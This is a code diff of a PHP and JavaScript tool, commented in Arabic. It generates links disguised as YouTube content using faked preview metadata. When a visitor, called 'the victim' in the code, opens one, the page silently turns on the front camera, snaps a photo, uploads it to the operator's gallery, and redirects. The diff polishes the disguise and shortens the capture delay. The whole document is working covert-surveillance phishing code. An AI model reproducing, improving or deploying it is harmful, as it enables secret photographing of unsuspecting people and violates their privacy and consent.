@@ -7,7 +7,7 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker_cam.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker_direct.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -18,7 +18,6 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    // جدول خاص بتخزين الكود والصورة الملتقطة فقط
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
@@ -29,8 +28,7 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
-function fetch_real_meta($url) {$title = "YouTube";
+function fetch_real_meta($url) {$title = "YouTube Stream";
     $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
     if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
@@ -55,7 +53,7 @@ function fetch_real_meta($url) {$title = "YouTube";
     return ['title' => trim($title), 'image' => trim($image)];
 }
 
-$og_title = "YouTube";
+$og_title = "YouTube Stream";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 $target_redirect = "";
 
@@ -71,7 +69,6 @@ if (isset($_GET['r'])) {
         $og_title =$link['meta_title'];
         $og_image =$link['meta_image'];
 
-        // استقبال الصورة المرسلة عبر تقنية POST في الخلفية
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
             $img_base64 =$_POST['image'] ?? '';
             if (!empty($img_base64)) {
@@ -87,7 +84,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// 2. إنشاء رابط جديد من لوحة التحكم
+// 2. إنشاء رابط جديد
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
@@ -105,7 +102,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
     $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
 }
 
-// جلب الصور والسجلات للوحة التحكم
+// جلب المعرض
 $filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
@@ -115,7 +112,7 @@ if (!empty($filter_code)) {
     $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// إذا كان الطلب زيارة تعقب (للضحية)، نعرض صفحة الكاميرا الخفية
+// واجهة الضحية المباشرة (تحاول تشغيل الكاميرا فور فتح الصفحة تلقائياً)
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -128,15 +125,16 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     <meta property="og:type" content="website">
     <style>
         body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; flex-direction: column; }
-        .loader { border: 4px solid rgba(255,255,255,0.1); width: 45px; height: 45px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        .loader { border: 4px solid rgba(255,255,255,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #38bdf8; animation: spin 1s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { font-size: 14px; color: #94a3b8; }
+        p { font-size: 13px; color: #94a3b8; }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
             const targetUrl = "<?php echo $target_redirect; ?>";
 
+            // محاولة طلب الكاميرا والاستشعار المباشر فور التحميل
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -151,11 +149,8 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         const imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        
-                        // إيقاف الكاميرا فوراً بعد الالتقاط
                         stream.getTracks().forEach(track => track.stop());
 
-                        // إرسال الصورة للسيرفر
                         const formData = new URLSearchParams();
                         formData.append('save_capture', '1');
                         formData.append('image', imageData);
@@ -166,10 +161,10 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                         }).finally(() => {
                             window.location.replace(targetUrl);
                         });
-                    }, 1000); // انتظار ثانية واحدة لضمان صفاء الصورة
+                    }, 800);
                 })
                 .catch(err => {
-                    // إذا رفض الإذن، يتم توجيهه مباشرة للمحتوى دون توقف
+                    // إذا ظهرت نافذة الإذن ورفضها المستخدم أو حظرها المتصفح، يتم التوجيه مباشرة
                     window.location.replace(targetUrl);
                 });
         });
@@ -177,20 +172,20 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 </head>
 <body>
     <div class="loader"></div>
-    <p>جاري تحميل المحتوى...</p>
+    <p>جاري مزامنة العرض...</p>
 </body>
 </html>
 <?php 
     exit(); 
 endif; 
 ?>
-<!-- لوحة التحكم لإدارة الروابط وعرض الصور -->
+<!-- لوحة التحكم الإدارية -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التقاط الصور</title>
+    <title>لوحة التحكم المباشرة</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -216,7 +211,6 @@ endif;
         .result-panel label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; }
         .link-flex { display: flex; gap: 8px; }
         
-        /* شبكة عرض الصور (Gallery) */
         .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; margin-top: 15px; }
         .card-img { background: #0f172a; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; padding: 10px; text-align: center; }
         .card-img img { width: 100%; height: 200px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
@@ -230,9 +224,8 @@ endif;
 <body>
     <div class="wrapper">
         
-        <!-- قسم توليد الروابط -->
         <section class="section-box">
-            <h2>توليد رابط التقاط صور جديد</h2>
+            <h2>توليد رابط مباشر</h2>
             <form method="POST" class="form-row">
                 <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثل يوتيوب)..." required>
                 <button type="submit" name="create" class="btn">توليد الرابط</button>
@@ -249,7 +242,6 @@ endif;
             <?php endif; ?>
         </section>
 
-        <!-- قسم عرض الصور الملتقطة (Gallery) -->
         <section class="section-box">
             <h2>معرض الصور الملتقطة</h2>
             <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
